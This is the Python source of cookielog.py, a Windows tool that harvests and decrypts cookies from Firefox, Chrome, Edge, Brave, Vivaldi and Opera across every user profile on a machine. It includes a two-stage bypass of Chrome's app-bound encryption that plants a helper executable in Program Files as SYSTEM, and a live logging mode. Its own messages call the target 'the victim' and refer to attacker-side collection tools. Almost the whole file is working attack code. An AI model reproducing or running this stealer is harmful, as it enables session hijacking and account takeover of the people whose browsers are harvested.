# cookielog.py — cookie logger: Firefox + Chromium (Chrome, Edge, Brave, Vivaldi, Opera)
#
#   EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING
#
#   This is offensive security tooling for penetration testing, red-team
#   exercises, and security education. Only use on systems you own or are
#   explicitly authorized to test. Unauthorized use is illegal. The authors
#   are not responsible for misuse.
#
#   python cookielog.py             # single pass -> cookies_all.txt + cookies_all.json
#   python cookielog.py --live      # continuous log -> cookie_log.jsonl (new/changed)
#   python cookielog.py --firefox   # filter browser (chrome|edge|brave|vivaldi|opera|firefox)
#   python cookielog.py --v20-sys   # app-bound stage 1, as SYSTEM
#   python cookielog.py --v20-usr   # stage 2, as user -> mc.key
#
# deps: pip install cryptography
import argparse, base64, ctypes, ctypes.wintypes as W, glob, hashlib, json, os, shutil, sqlite3, subprocess, sys, tempfile, time

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    def open_blob(key, nonce, blob):
        return AESGCM(key).decrypt(nonce, blob, None)
    def open_blob_flag(flag, key, nonce, blob):
        return (AESGCM(key) if flag == 1 else ChaCha20Poly1305(key)).decrypt(nonce, blob, None)
except ImportError:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
    def open_blob_flag(flag, key, nonce, blob):
        if flag == 1:
            c = AES.new(key, AES.MODE_GCM, nonce=nonce); return c.decrypt_and_verify(blob[:-16], blob[-16:])
        c = ChaCha20_Poly1305.new(key=key, nonce=nonce);  return c.decrypt_and_verify(blob[:-16], blob[-16:])
    def open_blob(key, nonce, blob): return open_blob_flag(1, key, nonce, blob)

HERE  = os.path.dirname(os.path.abspath(__file__))
STAGE = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "MediaCache")

# Chrome 156/157 dropped the static AES key from elevation_service.exe: the
# app-bound key is now unwrapped by the service itself (IElevator2Chrome::
# DecryptData). The client has to run from the Chrome install directory because
# the service validates the caller path (MaybeTrimProcessPath). Stage 1, which
# already runs as SYSTEM, drops the client there; stage 2 runs it as the user.
HELPER_NAME = "ckdec.exe"
HELPER_SRC  = os.path.join(HERE, "bin", HELPER_NAME)

CHROMIUM_REL = {
    "chrome":  (r"Google\Chrome\User Data", "local"),
    "edge":    (r"Microsoft\Edge\User Data", "local"),
    "brave":   (r"BraveSoftware\Brave-Browser\User Data", "local"),
    "vivaldi": (r"Vivaldi\User Data", "roaming"),
    "opera":   (r"Opera Software\Opera Stable", "roaming"),
}
FIREFOX_REL = r"Mozilla\Firefox\Profiles"


def profile_roots():
    """[(local_appdata, roaming_appdata)] for this user and every profile on the box.

    A SYSTEM process -- the only context that can unwrap the app-bound key -- gets
    SYSTEM's own %LOCALAPPDATA% (systemprofile), where no browser has ever run.
    The files belong to the user profiles, so they have to be enumerated.
    """
    roots, seen = [], set()

    def add(la, aa):
        k = (la.lower(), aa.lower())
        if la and k not in seen and os.path.isdir(la):
            seen.add(k)
            roots.append((la, aa))

    add(os.environ.get("LOCALAPPDATA", ""), os.environ.get("APPDATA", ""))
    # SystemDrive is "C:" without a separator: os.path.join("C:", "Users") is the
    # relative path "C:Users", not C:\Users. As the user this branch never ran
    # (the environment already supplied a root); as SYSTEM every other profile
    # vanished and stage 1 found no Local State.
    drive = os.environ.get("SystemDrive", "C:") + "\\"
    base = os.path.join(drive, "Users")
    try:
        for name in sorted(os.listdir(base)):
            d = os.path.join(base, name)
            if os.path.isdir(d):
                add(os.path.join(d, "AppData", "Local"),
                    os.path.join(d, "AppData", "Roaming"))
    except OSError:
        pass
    return roots


def chromium_map():
    """browser -> User Data root, first existing copy per browser name."""
    out = {}
    for la, aa in profile_roots():
        for name, (rel, where) in CHROMIUM_REL.items():
            if name in out:
                continue
            p = os.path.join(la if where == "local" else aa, rel)
            if os.path.isdir(p):
                out[name] = p
    return out


def firefox_roots():
    out = []
    for _la, aa in profile_roots():
        p = os.path.join(aa, FIREFOX_REL)
        if os.path.isdir(p):
            out.append(p)
    return out

# ------------------------------------------------------------------ DPAPI (ctypes, no pywin32)
class BLOB(ctypes.Structure):
    _fields_ = [("cbData", W.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

_c32 = ctypes.windll.crypt32
_c32.CryptUnprotectData.restype = W.BOOL
_c32.CryptUnprotectData.argtypes = [ctypes.POINTER(BLOB), W.LPCWSTR, ctypes.c_void_p,
                                    ctypes.c_void_p, ctypes.c_void_p, W.DWORD, ctypes.POINTER(BLOB)]
_k32 = ctypes.windll.kernel32
_k32.LocalFree.argtypes = [ctypes.c_void_p]

def dpapi(data, machine=False):
    buf = ctypes.create_string_buffer(data, len(data))
    inp = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out = BLOB()
    if not _c32.CryptUnprotectData(ctypes.byref(inp), None, None, None, None,
                                   1 if machine else 0, ctypes.byref(out)):
        raise OSError(f"DPAPI failed, error {ctypes.GetLastError()}")
    try:    return ctypes.string_at(out.pbData, out.cbData)
    finally: _k32.LocalFree(out.pbData)

# ------------------------------------------------------------------ locked database copy + read
def copy_group(path):
    """copies the .sqlite along with -wal/-shm: without -wal you lose the last cookies written"""
    tmp = tempfile.mkdtemp(prefix="ck")
    kept = []
    for p in (path, path + "-wal", path + "-shm"):
        if os.path.exists(p):
            d = os.path.join(tmp, os.path.basename(p))
            try:    shutil.copy2(p, d)
            except PermissionError:
                subprocess.run(["esentutl", "/y", p, "/d", d, "/o"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(d): kept.append(d)
    return tmp, kept

def rows(main, sql):
    """sql may be a list: old cookie DBs lack columns (top_frame_site_key,
    originAttributes) and a single query would throw on those profiles."""
    tmp, files = copy_group(main)
    if not files: shutil.rmtree(tmp, ignore_errors=True); return [], tmp
    db = files[0]
    try:    con = sqlite3.connect(db)                                  # applies the recovered WAL
    except sqlite3.DatabaseError:
        con = sqlite3.connect(f"file:{db}?mode=ro&immutable=1", uri=True)
    try:
        for q in ([sql] if isinstance(sql, str) else sql):
            try:    return con.execute(q).fetchall(), tmp
            except sqlite3.Error: continue
        return [], tmp
    finally: con.close()

# ------------------------------------------------------------------ Chromium keys
def v20_key(browser=None):
    """Return the per-browser app-bound key, falling back to the legacy mc.key."""
    names = []
    if browser:
        names.append(os.path.join(STAGE, f"mc-{browser}.key"))
    names.append(os.path.join(STAGE, "mc.key"))
    for p in names:
        if os.path.exists(p):
            with open(p, "rb") as f:
                return base64.b64decode(f.read())
    return None

def chromium_keys(local_state, browser=None):
    ks = {}
    try:
        with open(local_state, encoding="utf-8") as f: oc = json.load(f).get("os_crypt", {})
    except Exception: return ks
    if oc.get("encrypted_key"):
        b = base64.b64decode(oc["encrypted_key"])
        try:
            ks[b"v10"] = ks[b"v11"] = dpapi(b[5:])                     # b"DPAPI" prefix
        except OSError:
            print(f"  [v10] user DPAPI failed at {local_state}", file=sys.stderr)
    k = v20_key(browser)
    if k: ks[b"v20"] = k
    return ks

def decrypt_value(key, enc, host=None):
    raw = open_blob(key, enc[3:15], enc[15:])
    # Chromium (>=118 for v20, >=130 for v10) prefixes cookies with
    # SHA256(host_key) for domain binding. Verify the hash before stripping --
    # v10/v11 on older profiles carry no prefix and must be returned as-is.
    if host and len(raw) >= 32:
        if raw[:32] == hashlib.sha256(host.encode("utf-8")).digest():
            raw = raw[32:]
    return raw.decode("utf-8", "replace")

def dump_chromium(browser, root):
    out = []
    ls = os.path.join(root, "Local State")
    if not os.path.exists(ls): return out, []
    keys = chromium_keys(ls, browser)
    for db in glob.glob(os.path.join(root, "*", "Network", "Cookies")) + \
            glob.glob(os.path.join(root, "*", "Cookies")):              # pre-88 has no Network\
        parent = os.path.dirname(db)
        prof = os.path.basename(os.path.dirname(parent)) if os.path.basename(parent) == "Network" \
            else os.path.basename(parent)
        recs, tmp = rows(db, [
            "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
            "is_secure,is_httponly,samesite,COALESCE(top_frame_site_key,''),source_scheme,source_port "
            "FROM cookies",
            # pre-76 DBs (and Chrome's own migration leftovers) have no CHIPS columns
            "SELECT host_key,name,path,value,encrypted_value,expires_utc,"
            "is_secure,is_httponly,samesite,'',NULL,NULL FROM cookies"])
        for host, name, path, val, enc, exp, sec, http, samesite, tfk, sch, port in recs:
            enc = bytes(enc or b"")
            if enc[:3] in keys:
                try:    val = decrypt_value(keys[enc[:3]], enc, host)
                except Exception: val = ""
            rec = dict(browser=browser, profile=prof, domain=host, name=name,
                       path=path or "/", value=val,
                       expires=int(exp // 1_000_000 - 11_644_473_600) if exp else 0,
                       secure=bool(sec), httpOnly=bool(http),
                       sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                       encrypted=bool(enc))
            if tfk:
                # partitioned cookie (CHIPS): same host+name+path, different
                # top-level site. Without this in the identity the merge in
                # listen.py collapsed them and one partition vanished.
                rec["_partition"] = "%s|%s:%s" % (tfk, sch if sch is not None else "", port if port is not None else "")
            out.append(rec)
        shutil.rmtree(tmp, ignore_errors=True)
    return out, list(keys)

# ------------------------------------------------------------------ Firefox: no encryption (plaintext cookies)
def dump_firefox():
    out = []
    for db in [d for root in firefox_roots() for d in glob.glob(os.path.join(root, "*", "cookies.sqlite"))]:
        prof = os.path.basename(os.path.dirname(db))
        recs, tmp = rows(db, [
            "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite,originAttributes FROM moz_cookies",
            # Firefox < 42 has no originAttributes column
            "SELECT name,value,host,path,expiry,isSecure,isHttpOnly,sameSite,'' FROM moz_cookies"])
        for name, val, host, path, exp, sec, http, samesite, oa in recs:
            rec = dict(browser="firefox", profile=prof, domain=host, name=name, path=path or "/",
                       value=val, expires=exp or 0, secure=bool(sec), httpOnly=bool(http),
                       sameSite={-1: "Lax", 0: "None", 1: "Lax", 2: "Strict"}.get(samesite, "Lax"),
                       encrypted=False)
            if oa:
                # container tab (^userContextId=N) or first-party isolation: two
                # logins to the same site hold the same (host,name,path)
                rec["_partition"] = str(oa)
            out.append(rec)
        shutil.rmtree(tmp, ignore_errors=True)
    return out

# ------------------------------------------------------------------ output
def netscape(cookies):
    lines = ["# Netscape HTTP Cookie File"]
    for c in cookies:
        dom = c.get("domain") or ""
        dom = dom if dom.startswith(".") else "." + dom
        exp = int(c.get("expires", c.get("expirationDate", 0)) or 0)
        lines.append("\t".join([dom, "TRUE", c.get("path") or "/",
                                "TRUE" if c.get("secure") else "FALSE",
                                str(exp), c.get("name") or "", c.get("value") or ""]))
    return "\n".join(lines) + "\n"

def harvest(only):
    got = []
    for name, root in chromium_map().items():
        if only and name not in only: continue
        if os.path.isdir(root):
            part, _ = dump_chromium(name, root); got += part
    if not only or "firefox" in only:
        got += dump_firefox()
    return got

def main():
    if sys.platform != "win32":
        print("[-] cookielog.py stages the v20 app-bound key on the Windows victim")
        print("    (DPAPI + elevation_service + ProgramData). It has no Linux mode:")
        print("    run it on Windows; the attacker-side tools (listen.py, sink.py,")
        print("    auto.py, pick.py) are the ones ported to Linux.")
        return
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", action="store_true")
    ap.add_argument("--firefox", action="store_true"); ap.add_argument("--chrome", action="store_true")
    ap.add_argument("--edge", action="store_true");    ap.add_argument("--brave", action="store_true")
    ap.add_argument("--v20-sys", action="store_true"); ap.add_argument("--v20-usr", action="store_true")
    a = ap.parse_args()

    if a.v20_sys or a.v20_usr: return stage_v20(a)

    only = {k for k, f in (("firefox", a.firefox), ("chrome", a.chrome), ("edge", a.edge),
                           ("brave", a.brave)) if f} or None

    with open(os.path.join(HERE, "cookie_log.jsonl"), "a", encoding="utf-8") as log:
        seen, first = {}, True
        while True:
            got = harvest(only)
            cur = {(c["browser"], c["profile"], c["domain"], c["name"]): c["value"] for c in got}
            for k, v in cur.items():
                if seen.get(k) != v:
                    log.write(json.dumps({"at": int(time.time()), "browser": k[0], "profile": k[1],
                                          "domain": k[2], "name": k[3], "value": v},
                                         ensure_ascii=False) + "\n")
            log.flush(); seen = cur
            with open(os.path.join(HERE, "cookies_all.txt"), "w", encoding="utf-8") as f: f.write(netscape(got))
            with open(os.path.join(HERE, "cookies_all.json"), "w", encoding="utf-8") as f:
                f.write(json.dumps(got, indent=1, ensure_ascii=False))
            if first:
                print(f"{len(got)} cookies -> cookies_all.txt / cookies_all.json")
                if not any(c["browser"] != "firefox" for c in got):
                    print("  (no Chromium decrypted: Chrome/Edge >=127 -> run v20 extraction)")
                first = False
            if not a.live: break
            print(f"\r{len(got)} live cookies  {time.strftime('%H:%M:%S')}  [Ctrl+C to stop]", end="")
            time.sleep(3)

# ------------------------------------------------------------------ app-bound (Chrome/Edge/Brave >= 127)
def abe_blobs():
    """returns [(browser, APPB blob)] for every Chromium with app_bound_encrypted_key"""
    got = []
    for name, root in chromium_map().items():
        ls = os.path.join(root, "Local State")
        if not os.path.exists(ls): continue
        try:
            with open(ls, encoding="utf-8") as f: ab = json.load(f)["os_crypt"]["app_bound_encrypted_key"]
        except Exception: continue
        blob = base64.b64decode(ab)
        if blob[:4] != b"APPB":
            print(f"  [{name}] app_bound_encrypted_key missing APPB prefix: Chrome changed the format")
            continue
        got.append((name, blob[4:]))
    return got

def chrome_app_dir():
    """Chrome's Application directory on a system-wide install, or None."""
    for base in (os.environ.get("ProgramFiles", r"C:\Program Files"),
                 os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)")):
        p = os.path.join(base, "Google", "Chrome", "Application")
        if os.path.isdir(p):
            return p
    return None

def deployed_helper():
    d = chrome_app_dir()
    return os.path.join(d, HELPER_NAME) if d else None

def deploy_helper():
    r"""Copy the service client into Chrome's Application dir. Needs SYSTEM.

    The service checks the caller path: C:\Program Files\Google\Chrome\
    Application\ckdec.exe trims to C:\Program Files\Google\Chrome and passes.
    A user-writable copy under %LOCALAPPDATA%\Google\Chrome is rejected
    (0x8004A007), so the file has to land in Program Files.
    """
    dst = deployed_helper()
    if not dst:
        print("  chrome install directory not found -- helper not deployed")
        return None
    if not os.path.exists(HELPER_SRC):
        print(f"  missing {HELPER_SRC} -- build it first")
        return None
    try:
        shutil.copy2(HELPER_SRC, dst)
    except OSError as e:
        print(f"  helper copy failed: {e}")
        return None
    return dst

def stage_v20(a):
    os.makedirs(STAGE, exist_ok=True)
    if a.v20_sys:                                                       # layer 1: MACHINE DPAPI
        # SYSTEM owns the directory it just created; stage 2 runs as the user and
        # has to write mc-*.key in it. BUILTIN\Users by SID, so the ACL is
        # locale-proof ("Users" is "Usuarios" here).
        subprocess.run(["icacls", STAGE, "/grant", "*S-1-5-32-545:(OI)(CI)F"],
                       capture_output=True)
        helper = deploy_helper()
        if helper:
            print(f"  helper deployed: {helper}")
        for name, blob in abe_blobs():
            if name != "chrome":
                print(f"  [{name}] separate elevation service -- not wired yet")
                continue
            # the raw payload (APPB stripped) is what DecryptData expects; it does
            # both DPAPI layers inside the service, so stage 2 does not need the
            # machine-unwrapped .stage1 shortcut
            with open(os.path.join(STAGE, f"{name}.appb"), "wb") as f:
                f.write(blob)
            try:
                # keep the SYSTEM-layer probe: it fails loudly here instead of
                # surfacing as an opaque service error in stage 2
                data = dpapi(blob, machine=True)
            except OSError as e:
                print(f"  [{name}] system DPAPI: {e}")
                continue
            with open(os.path.join(STAGE, f"{name}.stage1"), "wb") as f:
                f.write(data)
        print(f"stage 1 ok -> {STAGE}")
        return
    got = 0
    # stage 2 starts from what stage 1 actually wrote: the file list is the truth,
    # not the browser map (stage 2 may run under a different context)
    for fn in sorted(os.listdir(STAGE)):
        if not fn.endswith(".appb"):
            continue
        name = fn[:-len(".appb")]
        if name != "chrome":
            continue
        helper = deployed_helper()
        if not helper or not os.path.exists(helper):
            print(f"  [{name}] helper missing -- run stage 1 as SYSTEM first")
            continue
        src = os.path.join(STAGE, fn)
        out = os.path.join(STAGE, f"{name}.rawkey")
        r = subprocess.run([helper, src, out], capture_output=True, text=True, timeout=60)
        line = (r.stdout or r.stderr or "").strip().splitlines()
        if r.returncode != 0 or not os.path.exists(out):
            print(f"  [{name}] service call failed: {line[-1] if line else 'no output'}")
            continue
        with open(out, "rb") as f: key = f.read()
        os.remove(out)
        if len(key) != 32:
            print(f"  [{name}] unexpected key length {len(key)}")
            continue
        enc = base64.b64encode(key)
        with open(os.path.join(STAGE, f"mc-{name}.key"), "wb") as f: f.write(enc)
        # legacy single file: only meaningful when one browser is in play
        with open(os.path.join(STAGE, "mc.key"), "wb") as f: f.write(enc)
        got += 1
    print("stage 2 ok: mc.key generated" if got else "nothing to do in stage 2")

if __name__ == "__main__":
    main()
